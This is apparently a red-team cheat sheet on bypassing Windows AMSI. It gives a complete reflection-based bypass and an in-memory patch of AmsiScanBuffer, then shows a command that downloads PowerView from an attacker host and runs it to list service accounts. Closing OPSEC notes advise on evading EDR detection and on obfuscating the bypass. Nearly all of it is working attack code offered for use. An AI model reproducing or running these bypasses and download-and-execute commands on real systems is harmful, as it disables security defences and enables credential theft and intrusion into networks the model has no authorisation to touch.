# AMSI Bypass Techniques

## Scenario
Need to run PowerShell tools on Windows target with AMSI blocking execution.

## Step 1: Verify AMSI is Active
```powershell
PS C:\> "Invoke-Mimikatz"
At line:1 char:1
+ "Invoke-Mimikatz"
+ ~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
```

## Step 2: Reflection-Based AMSI Bypass
```powershell
# Obfuscated reflection bypass
PS C:\> $a=[Ref].Assembly.GetTypes();ForEach($b in $a){if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');ForEach($e in $d){if($e.Name -like "*Context"){$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)

# Verify bypass worked
PS C:\> "Invoke-Mimikatz"
Invoke-Mimikatz    # <-- No longer blocked, just echoed as string
```

## Step 3: Execute Blocked Tools
```powershell
# Now PowerShell tools can be loaded
PS C:\> IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/PowerView.ps1')
PS C:\> Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname

samaccountname    serviceprincipalname
--------------    --------------------
svc_sql           MSSQLSvc/sql01:1433
svc_web           HTTP/intranet
```

## Alternative: Patching amsi.dll in Memory
```powershell
# Force AMSI scan to always return clean
$Win32 = @"
using System;using System.Runtime.InteropServices;
public class Win32{
[DllImport("kernel32")]public static extern IntPtr GetProcAddress(IntPtr h,string n);
[DllImport("kernel32")]public static extern IntPtr LoadLibrary(string n);
[DllImport("kernel32")]public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint n,out uint o);
}
"@
Add-Type $Win32
$addr=[Win32]::GetProcAddress([Win32]::LoadLibrary("amsi.dll"),"AmsiScanBuffer")
$p=0;[Win32]::VirtualProtect($addr,[uint32]5,0x40,[ref]$p)
$patch=[Byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($patch,0,$addr,6)
```

## OPSEC Notes
- Reflection bypass: 🟡 Moderate — some EDR detect the pattern
- amsi.dll patch: 🟡 Moderate — kernel32 API calls may trigger heuristics
- Both are in-memory only — no files written to disk
- Consider: obfuscating the bypass itself with string manipulation
- Alternative: Run from C# (.NET) directly to avoid PowerShell AMSI entirely
